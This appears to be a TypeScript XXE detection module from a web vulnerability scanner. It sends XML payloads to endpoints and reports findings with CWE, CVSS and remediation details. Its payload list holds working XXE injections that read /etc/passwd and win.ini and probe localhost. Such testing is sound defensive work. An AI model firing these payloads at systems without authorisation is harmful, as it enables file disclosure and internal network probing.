import type { ScanModuleInterface, EndpointInfo, ModuleFinding } from '../scanner/orchestrator';
import type { HttpClient } from '../scanner/http-client';

const XXE_PAYLOADS = [
  {
    name: 'File Read (/etc/passwd)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    markers: ['root:', '/bin/bash', '/bin/sh', 'nobody:', '/home/'],
  },
  {
    name: 'File Read (Windows)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    markers: ['[fonts]', '[extensions]', 'for 16-bit'],
  },
  {
    name: 'Internal Network Probe',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
    markers: ['<html', '<!DOCTYPE', 'HTTP/'],
  },
  {
    name: 'Parameter Entity (Blind)',
    payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><root>test</root>',
    markers: [],
  },
];

const XML_PARSER_ERROR_PATTERNS = ['SAXParseException', 'XMLSyntaxError', 'DOMException', 'parser error', 'not well-formed', 'Content is not allowed in prolog'];

const XML_CONTENT_TYPES = ['text/xml', 'application/xml', 'application/soap+xml', 'application/xhtml+xml'];

export class XxeModule implements ScanModuleInterface {
  id = 'xxe';
  name = 'XXE Detection';

  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    const findings: ModuleFinding[] = [];

    // Find XML-accepting endpoints
    const xmlEndpoints = endpoints.filter((ep) =>
      ep.method === 'POST' && (
        XML_CONTENT_TYPES.some((ct) => ep.contentType.includes(ct)) || ep.params.length === 0
      )
    );

    // Also test the main URL and common API paths
    const testUrls = [url, ...xmlEndpoints.map((ep) => ep.url)];
    const tested = new Set<string>();

    for (const testUrl of testUrls) {
      if (tested.has(testUrl)) continue;
      tested.add(testUrl);

      for (const contentType of ['text/xml', 'application/xml']) {
        // Get baseline response time for blind XXE timing comparison
        const baselineXml = '<?xml version="1.0"?><root>test</root>';
        const baselineStart = Date.now();
        const baselineRes = await client.post(testUrl, baselineXml, { 'Content-Type': contentType });
        const baselineDuration = Date.now() - baselineStart;

        for (const { name, payload, markers } of XXE_PAYLOADS) {
          const probeStart = Date.now();
          const res = await client.post(testUrl, payload, { 'Content-Type': contentType });
          const probeDuration = Date.now() - probeStart;
          if (res.status === 0 || res.status >= 500) continue;

          // Check for file content in response (marker-based detection)
          if (markers.length > 0) {
            const hasMarker = markers.some((m) => res.body.includes(m));
            if (hasMarker) {
              findings.push({
                severity: 'critical',
                title: `XML External Entity Injection (${name})`,
                description: `The endpoint "${testUrl}" processes XML with external entity expansion. The payload successfully read server files or probed internal services. This can lead to file disclosure, SSRF, and potentially remote code execution.`,
                url: testUrl,
                remediation: 'Disable DTD processing and external entities in your XML parser. In Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true). In PHP: libxml_disable_entity_loader(true).',
                cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 9.1,
                evidence: { payload_name: name, content_type: contentType, response_preview: res.body.slice(0, 300) },
              });
              return findings;
            }
          }

          // Blind XXE: for payloads with empty markers, check timing difference
          if (markers.length === 0 && probeDuration > baselineDuration + 3000) {
            findings.push({
              severity: 'high',
              title: `Blind XXE Detected (${name}) — Timing-Based`,
              description: `The endpoint "${testUrl}" took ${probeDuration}ms to respond to the XXE payload vs ${baselineDuration}ms baseline. The significant delay suggests the XML parser attempted to resolve external entities, confirming the server processes DTDs.`,
              url: testUrl,
              remediation: 'Disable DTD processing and external entity resolution in the XML parser.',
              cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 7.5,
              evidence: { payload_name: name, content_type: contentType, probe_duration_ms: probeDuration, baseline_duration_ms: baselineDuration },
            });
            break;
          }

          // Error-based detection: check for XML parser error strings
          const detectedErrors = XML_PARSER_ERROR_PATTERNS.filter((ep) => res.body.includes(ep));
          if (detectedErrors.length > 0) {
            findings.push({
              severity: 'medium',
              title: 'XML Parser Accepts DTDs (Potential XXE)',
              description: `The endpoint "${testUrl}" processes XML input and triggered parser errors: ${detectedErrors.join(', ')}. While the payload didn't extract data, the XML parser is actively processing DTD declarations and may be vulnerable to blind XXE or denial-of-service via entity expansion.`,
              url: testUrl,
              remediation: 'Disable DTD processing entirely in the XML parser configuration.',
              cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 5.3,
              evidence: { content_type: contentType, detected_errors: detectedErrors },
            });
            break;
          }

          // Legacy error detection
          if (res.body.includes('DOCTYPE') || res.body.includes('entity') || res.body.includes('parser error')) {
            findings.push({
              severity: 'medium',
              title: 'XML Parser Accepts DTDs (Potential XXE)',
              description: `The endpoint "${testUrl}" processes XML input and appears to parse DTD declarations. While the payload didn't extract data, the XML parser may be vulnerable to blind XXE or denial-of-service via entity expansion.`,
              url: testUrl,
              remediation: 'Disable DTD processing entirely in the XML parser configuration.',
              cwe_id: 'CWE-611', owasp_category: 'A03:2021', cvss_score: 5.3,
              evidence: { content_type: contentType },
            });
            break;
          }
        }
      }
    }

    return findings;
  }
}
